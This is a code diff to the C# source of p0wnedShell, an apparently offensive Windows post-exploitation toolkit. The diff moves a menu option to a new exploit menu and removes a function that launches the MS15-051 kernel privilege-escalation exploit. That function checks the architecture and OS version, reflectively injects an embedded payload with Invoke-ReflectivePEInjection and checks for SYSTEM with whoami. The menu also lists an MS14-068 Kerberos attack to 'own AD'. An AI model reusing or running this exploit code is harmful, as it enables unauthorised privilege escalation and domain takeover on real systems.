@@ -210,7 +210,7 @@ namespace p0wnedShell
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Exploitation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 8. Get into Ring0 using the MS15-051 Vulnerability.");
+            Console.WriteLine(" 8. Get into Ring0 using the MS14-058 and MS15-051 Vulnerability.");
             Console.WriteLine();
             Console.WriteLine(" 9. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
             Console.WriteLine();
@@ -322,7 +322,7 @@ namespace p0wnedShell
                         }
                         break;
                     case 8:
-                        Pshell.MS15_051();
+                        Exploits.ExploitMenu();
                         break;
                     case 9:
                         if (Arch == "x86")
@@ -1314,97 +1314,6 @@ namespace p0wnedShell
             {
                 Console.WriteLine(e.Message);
             }
-        }
-
-        public static void MS15_051()
-        {
-            string[] toPrint = { "* Get into Ring0 using the MS15-051 Vulnerability.                  *" };
-
-            Program.PrintBanner(toPrint);
-
-            string osArch = "x86";
-            if (EnvironmentHelper.Is64BitOperatingSystem())
-            {
-                osArch = "x64";
-            }
-
-            string procArch = "x86";
-            if (EnvironmentHelper.Is64BitProcess())
-            {
-                procArch = "x64";
-            }
-
-            //detect if the correct architecture is being used
-            if (procArch != osArch)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Your OS Architectecture does not match the version of p0wnedShell you run.");
-                Console.WriteLine("[+] To run this Exploit, you should run the " + osArch + " version of p0wnedShell\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-                return;
-            }
-
-            OperatingSystem OS = System.Environment.OSVersion;
-            string LatestOSVersion = "6.3";
-            decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
-            if (EnvironmentHelper.RtlGetVersion() > latestOSVersionDec)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] MS15-051 is only exploitable on Windows 8.1/2012 R2 or lower.\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-                return;
-            }
-
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("This Exploit can only succeed when patch KB3045171 is not installed on this system.\n");
-            Console.ResetColor();
-            Console.Write("[+] Please wait until loaded...\n");
-            Console.WriteLine();
-
-            string MS15_051 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.MS15_051(osArch) + "\" -split ' ') -Verbose";
-            try
-            {
-                P0wnedListener.Execute(MS15_051);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-
-            string Whoami = "whoami";
-            string SystemPower = null;
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("\n[+] let's check if our exploit succeeded:\n");
-            Console.ResetColor();
-            try
-            {
-                SystemPower = RunPSCommand(Whoami);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-            if (SystemPower.IndexOf("system", 0, StringComparison.OrdinalIgnoreCase) != -1)
-            {
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("[+] The Ring has awoken, it’s heard its masters call :)\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue and Get The Party Started...");
-                Console.ReadLine();
-            }
-            else
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[+] Exploit failed, System probably already patched!\n");
-                Console.ResetColor();
-                Console.WriteLine("Press Enter to Continue...");
-                Console.ReadLine();
-            }
-            return;
         }
 
         public static void PsExecShell(string Hostname)
